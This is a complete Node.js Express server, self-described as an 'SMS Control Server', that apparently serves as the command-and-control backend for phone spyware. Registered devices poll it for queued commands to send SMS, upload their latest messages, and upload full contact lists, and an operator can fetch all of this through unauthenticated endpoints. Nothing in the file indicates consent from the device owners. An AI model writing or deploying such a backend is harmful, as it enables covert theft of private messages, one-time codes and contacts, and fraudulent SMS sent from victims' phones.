const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: "20mb" }));

/**
 * In-memory stores
 */
const devices = {};        // deviceId -> { deviceId, model, registeredAt }
const commands = {};       // deviceId -> [ { id, number, message } ]
const smsData = {};        // deviceId -> latest SMS
const contactsStore = {};  // deviceId -> { contacts, updatedAt }

/**
 * ------------------ Device Registration ------------------
 */
app.post("/register", (req, res) => {
  const { deviceId, model } = req.body;

  if (!deviceId) {
    return res.status(400).json({ success: false, message: "deviceId required" });
  }

  devices[deviceId] = {
    deviceId,
    model: model || "unknown",
    registeredAt: new Date()
  };

  if (!commands[deviceId]) commands[deviceId] = [];
  if (!smsData[deviceId]) smsData[deviceId] = [];

  res.json({ success: true, deviceId });
});

/**
 * ------------------ Fetch all devices ------------------
 */
app.get("/fetch", (req, res) => {
  res.json({ success: true, devices: Object.values(devices) });
});

/**
 * ------------------ Send SMS command to device ------------------
 */
app.post("/sendsms", (req, res) => {
  const { deviceId, number, message } = req.body;

  if (!devices[deviceId]) return res.status(404).json({ success: false, message: "Device not found" });

  const cmd = { id: uuidv4(), number, message };
  commands[deviceId].push(cmd);

  res.json({ success: true, command: cmd });
});

/**
 * ------------------ Device polls for commands ------------------
 */
app.get("/commands", (req, res) => {
  const { deviceId } = req.query;
  if (!commands[deviceId]) return res.json([]);
  
  const pending = commands[deviceId];
  commands[deviceId] = []; // clear after sending
  res.json(pending);
});

/**
 * ------------------ Device sends latest SMS ------------------
 */
app.post("/smsread", (req, res) => {
  const { deviceId, sms } = req.body;
  if (!deviceId || !sms) return res.status(400).json({ success: false, message: "deviceId or sms missing" });

  smsData[deviceId] = sms;
  res.json({ success: true });
});

/**
 * ------------------ Fetch latest SMS of a device ------------------
 */
app.post("/get-sms", (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ success: false, message: "deviceId required" });

  res.json({ success: true, sms: smsData[deviceId] || [] });
});

/**
 * ------------------ CONTACT API ------------------
 */
app.post("/contact", (req, res) => {
  const { deviceId, contacts } = req.body;

  if (!deviceId || !Array.isArray(contacts)) {
    return res.status(400).json({ success: false, message: "Invalid JSON payload" });
  }

  const cleanContacts = contacts
    .filter(c => c && c.number)
    .map(c => ({
      name: c.name || "",
      number: String(c.number).replace(/\s+/g, "")
    }));

  contactsStore[deviceId] = {
    deviceId,
    contacts: cleanContacts,
    updatedAt: new Date().toISOString()
  };

  console.log(`📞 Contacts | deviceId=${deviceId} | total=${cleanContacts.length}`);

  res.json({ success: true, deviceId, totalContacts: cleanContacts.length, message: "Contacts saved successfully" });
});

/**
 * GET contacts of a device
 * /contact/:deviceId
 */
app.get("/contact/:deviceId", (req, res) => {
  const data = contactsStore[req.params.deviceId];
  if (!data) return res.status(404).json({ success: false, message: "Device not found" });

  res.json({ success: true, deviceId: data.deviceId, totalContacts: data.contacts.length, contacts: data.contacts });
});

/**
 * Health check
 */
app.get("/", (req, res) => {
  res.json({ success: true, message: "SMS Control Server running on Render" });
});

/**
 * Start server
 */
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
